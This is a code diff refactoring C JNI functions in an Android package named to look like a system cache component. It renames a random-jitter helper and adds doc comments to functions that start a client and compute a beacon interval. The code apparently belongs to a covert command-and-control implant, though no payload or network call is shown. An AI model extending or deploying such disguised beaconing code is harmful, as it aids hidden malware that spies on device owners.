@@ -5,8 +5,16 @@
 #include "client.h"
 #include "client_config.h"
 #include "common.h"
-static int64_t get_random(int64_t max_random);
 
+static int64_t GetRandom(int64_t max_random);
+
+/**
+ * @brief Main network loop
+ * 
+ * @param[in] env JNI environment pointer
+ * @param[in] thiz Java object reference
+ * @return jlong Next beacon interval in seconds
+ */
 JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_syncData(JNIEnv* env, jobject thiz)
 {
     client_config_t* config = NULL;
@@ -20,12 +28,19 @@ JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_syncData(JNIEnv*
     DPRINTF("STARTING CLIENT\n");
     StartClient(config);
 
-    next_interval = (int64_t)config->beacon_interval + get_random(config->beacon_jitter);
+    next_interval = (int64_t)config->beacon_interval + GetRandom(config->beacon_jitter);
     DPRINTF("NEXT INTERVAL %lld\n", (long long)next_interval);
 
     return next_interval;
 }
 
+/**
+ * @brief Get initial random jitter interval
+ * 
+ * @param[in] env JNI environment pointer
+ * @param[in] thiz Java object reference
+ * @return jlong Random jitter interval in seconds
+ */
 JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment(JNIEnv* env,
                                                                                  jobject thiz)
 
@@ -36,7 +51,7 @@ JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment
     client_config_t* config = NULL;
     config = GetClientConfig();
 
-    next_interval = get_random(config->beacon_jitter);
+    next_interval = GetRandom(config->beacon_jitter);
     if (0 > next_interval)
     {
         next_interval = next_interval * (-1);
@@ -46,7 +61,13 @@ JNIEXPORT jlong JNICALL Java_com_android_systemcache_InitWorker_queryEnvironment
     return next_interval;
 }
 
-static int64_t get_random(int64_t max_random)
+/**
+ * @brief Generate random number in range [-max_random, +max_random]
+ * 
+ * @param[in] max_random Maximum absolute value for random range
+ * @return int64_t Random number in specified range
+ */
+static int64_t GetRandom(int64_t max_random)
 {
     int64_t random;
     if (max_random == 0)
